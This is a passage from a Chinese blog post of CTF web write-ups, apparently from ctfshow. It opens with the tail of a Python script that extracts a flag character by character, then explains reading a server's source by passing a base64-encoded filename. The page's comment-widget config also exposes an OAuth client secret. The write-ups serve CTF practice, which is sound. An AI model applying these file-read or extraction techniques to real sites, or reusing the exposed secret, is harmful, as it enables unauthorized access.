<span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1><span id="愚人节杯">愚人节杯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>查看浏览器发现url链接是base64加密。<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p>
<p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码，然后通过base64解密。</p>
<p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/image-20230419181149917.png" alt="image-20230419181149917"></p>
</div><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="post-nav"><a class="pre" href="/2023/05/08/ctfshow-Crypto/">ctfshow-Crypto</a><a class="next" href="/2023/04/18/Buuoj/">Buuoj</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script>var gitalk = new Gitalk({
  clientID: 'd154fff64901622afbb6',
  clientSecret: '5b3f1d58c331b54703e4477e1f8fa1e42e9c1082',
  repo: 'Disda-coding.github.io',
  owner: 'Disda-coding',
  admin: ['Disda-coding'],
  id: md5(location.pathname),
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/">Spring</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/design-pattern/">design pattern</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/log/">log</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pandas/">pandas</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E8%80%83%E7%82%B9/">分布式考点</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%90%E7%A0%81/">源码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A2%E7%BB%8F/">面经</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">19</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/%E9%98%BF%E9%87%8C%E9%9D%A2%E8%AF%95/" style="font-size: 15px;">阿里面试</a> <a href="/tags/%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%80%83%E7%AE%97%E6%B3%95%E9%A2%98/" style="font-size: 15px;">面试常考算法题</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" style="font-size: 15px;">设计模式</a> <a href="/tags/Algorithm/" style="font-size: 15px;">Algorithm</a> <a href="/tags/java/" style="font-size: 15px;">java</a> <a href="/tags/C/" style="font-size: 15px;">C++</a> <a href="/tags/%E9%93%BE%E8%A1%A8/" style="font-size: 15px;">链表</a> <a href="/tags/Java%E5%B8%B8%E7%94%A8%E7%B1%BB%E5%BA%93%E4%B8%8E%E6%8A%80%E5%B7%A7/" style="font-size: 15px;">Java常用类库与技巧</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 15px;">计算机网络</a> <a href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/" style="font-size: 15px;">大数据</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">机器学习</a> <a href="/tags/%E5%AE%9E%E4%B9%A0/" style="font-size: 15px;">实习</a> <a href="/tags/%E6%BA%90%E7%A0%81/" style="font-size: 15px;">源码</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/Java%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 15px;">Java虚拟机</a> <a href="/tags/%E6%A0%91/" style="font-size: 15px;">树</a> <a href="/tags/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/" style="font-size: 15px;">实习日记</a> <a href="/tags/HashMap/" style="font-size: 15px;">HashMap</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" style="font-size: 15px;">动态规划</a> <a href="/tags/SpringBoot/" style="font-size: 15px;">SpringBoot</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 15px;">数据库</a> <a href="/tags/git/" style="font-size: 15px;">git</a> <a href="/tags/Tencent/" style="font-size: 15px;">Tencent</a> <a href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" style="font-size: 15px;">面试题</a> <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 15px;">中间件</a> <a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 15px;">消息队列</a> <a href="/tags/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/" style="font-size: 15px;">Java多线程</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 15px;">操作系统</a> <a href="/tags/%E9%A1%B9%E7%9B%AE/" style="font-size: 15px;">项目</a> <a href="/tags/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/" style="font-size: 15px;">java多线程</a> <a href="/tags/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/" style="font-size: 15px;">排序算法</a> <a href="/tags/spring/" style="font-size: 15px;">spring</a> <a href="/tags/redis/" style="font-size: 15px;">redis</a> <a href="/tags/%E5%89%91%E6%8C%87Offer/" style="font-size: 15px;">剑指Offer</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE-pandas/" style="font-size: 15px;">机器学习 大数据 pandas</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/05/08/ctfshow-Crypto/">ctfshow-Crypto</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/19/ctfshow-Web%E7%AF%87/">ctfshow-Web篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/18/Buuoj/">Buuoj</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/">ctf-b站笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/29/ctf/">CTFHub入门笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/23/Spring%20Security/">Spring Security</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/22/git/">Git操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/13/Pandas/">Pandas基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/MachineLearning/">机器学习基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/">机器学习时间序列实战</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://cyc2018.github.io/CS-Notes/#/README" title="CS-Note" target="_blank">CS-Note</a><ul></ul><a href="https://www.javadoop.com/" title="Java源码解析" target="_blank">Java源码解析</a><ul></ul><a href="https://github.com/Disda-coding/advanced-java" title="Java 工程师进阶知识完全扫盲" target="_blank">Java 工程师进阶知识完全扫盲</a><ul></ul><a href="https://github.com/Disda-coding/Java-concurrency" title="Java高并发" target="_blank">Java高并发</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2023 <a href="/." rel="nofollow">Disda.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> </a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Disda.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/2.0.4/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/2.1.4/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/2.1.4/toastr.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>